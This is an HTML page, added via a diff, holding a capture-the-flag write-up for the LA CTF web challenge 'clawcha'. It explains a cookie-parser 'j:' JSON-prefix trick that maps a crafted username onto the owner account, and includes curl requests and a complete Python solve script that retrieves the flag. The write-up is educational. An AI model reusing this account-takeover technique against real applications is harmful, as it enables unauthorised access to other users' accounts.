@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>clawcha - web - LA CTF | Marcio Herobrine</title>
+    <link rel="stylesheet" href="../home.css" />
+  </head>
+  <body>
+    <main class="container">
+      <section class="left">
+        <img src="/assets/herobrine.png" alt="Herobrine logo" />
+        <div class="name">Marcio Herobrine</div>
+      </section>
+
+      <div class="divider" aria-hidden="true"></div>
+
+      <section id="right">
+        <h2>clawcha - web - LA CTF</h2>
+        <article class="member writeup">
+          <div class="info">
+            <h3 id="summary">Summary</h3>
+            <p>
+              Solved this one on day two. Looked like a silly gacha claw
+              machine challenge but the real bug was in how cookies get parsed.
+            </p>
+
+            <h3 id="initial-testing">Initial Testing</h3>
+            <p>
+              I started by poking at the <code>/claw</code> endpoint, sending
+              random values for <code>item</code> - <code>flag</code>,
+              <code>__proto__</code>, arrays, numbers, whatever.
+            </p>
+
+            <pre><code class="language-bash">curl -s https://clawcha.chall.lac.tf/claw \
+  -H 'content-type: application/json' \
+  -d '{"item":"flag"}'
+{"success":false,"msg":"better luck next time"}</code></pre>
+
+            <h3 id="source-review">Source Review</h3>
+            <p>
+              Nothing. So I looked at the source. There's a hardcoded owner
+              account:
+            </p>
+
+            <pre><code class="language-js">const users = new Map([
+  ['r2uwu2', { username: 'r2uwu2', password: secret, owner: true }],
+]);</code></pre>
+
+            <p>
+              Login and register share the same endpoint, and user data is kept
+              in memory through a Map.
+            </p>
+
+            <h3 id="vulnerability">Vulnerability</h3>
+            <p>
+              The actual vulnerability is in how signed cookies are handled:
+            </p>
+
+            <pre><code class="language-js">app.use(cookieParser(secret));
+...
+if (typeof req.signedCookies.username === 'string') {
+  if (users.has(req.signedCookies.username)) {
+    res.locals.user = users.get(req.signedCookies.username);
+  }
+}</code></pre>
+
+            <p>
+              The server validates the signature, then tries to JSON-parse any
+              cookie value that starts with <code>j:</code>. So if you
+              register a username like <code>j:"r2uwu2"</code>, the server
+              stores it as-is in the Map, but when it reads the signed cookie
+              back it parses the JSON and gets the string
+              <code>r2uwu2</code> - which maps to the owner account.
+            </p>
+
+            <h3 id="exploit-path">Exploit Path</h3>
+
+            <pre><code class="language-bash">curl -s https://clawcha.chall.lac.tf/claw \
+  -b cookies.txt \
+  -H 'content-type: application/json' \
+  -d '{"item":"flag"}'
+{"success":true,"msg":"lactf{m4yb3_th3_r34l_g4ch4_w4s_l7f3}"}</code></pre>
+              <img src="/assets/lactf/clawcha.png" alt="clawcha clawing the flag" />
+            <h3 id="solve-script">Solve Script</h3>
+            <p>Solve script:</p>
+
+            <pre><code class="language-python">#!/usr/bin/env python3
+import argparse
+import sys
+import requests
+
+
+def _solve_once(base_url: str) -> str:
+    base_url = base_url.rstrip("/")
+    s = requests.Session()
+    password = "x"
+    last_login = None
+
+    for spaces in range(0, 32):
+        username = f'j:{" " * spaces}"r2uwu2"'
+        r = s.post(f"{base_url}/login", json={"username": username, "password": password}, timeout=10)
+        r.raise_for_status()
+        j = r.json()
+        last_login = j
+
+        if j.get("success"):
+            break
+    else:
+        raise RuntimeError(f"login failed: {last_login}")
+
+    r = s.post(f"{base_url}/claw", json={"item": "flag"}, timeout=10)
+    r.raise_for_status()
+    j = r.json()
+
+    if not j.get("success"):
+        raise RuntimeError(f"claw failed: {j}")
+
+    return j["msg"]
+
+
+def solve(base_url: str) -> str:
+    if not base_url.startswith(("http://", "https://")):
+        last = None
+        for scheme in ("https://", "http://"):
+            try:
+                return _solve_once(scheme + base_url)
+            except requests.exceptions.RequestException as e:
+                last = e
+        raise last
+
+    try:
+        return _solve_once(base_url)
+    except requests.exceptions.RequestException:
+        if base_url.startswith("https://"):
+            return _solve_once("http://" + base_url.removeprefix("https://"))
+        raise
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(description="Exploit clawcha to read the flag")
+    ap.add_argument(
+        "--base-url",
+        default="https://clawcha.chall.lac.tf",
+        help="Base URL (default: https://clawcha.chall.lac.tf)",
+    )
+    args = ap.parse_args()
+
+    try:
+        flag = solve(args.base_url)
+    except Exception as e:
+        print(f"error: {e}", file=sys.stderr)
+        return 1
+
+    print(flag)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())</code></pre>
+
+            <h3 id="run">Run</h3>
+            <pre><code class="language-bash">python3 solve.py --base-url clawcha.chall.lac.tf</code></pre>
+
+            <h3 id="final-note">Final Note</h3>
+            <p>
+              Spent way too long trying random stuff on the
+              <code>/claw</code> endpoint before actually reading the
+              signed cookie flow. The <code>j:</code> prefix trick was the
+              whole challenge.
+            </p>
+          </div>
+        </article>
+      </section>
+    </main>
+  </body>
+</html>
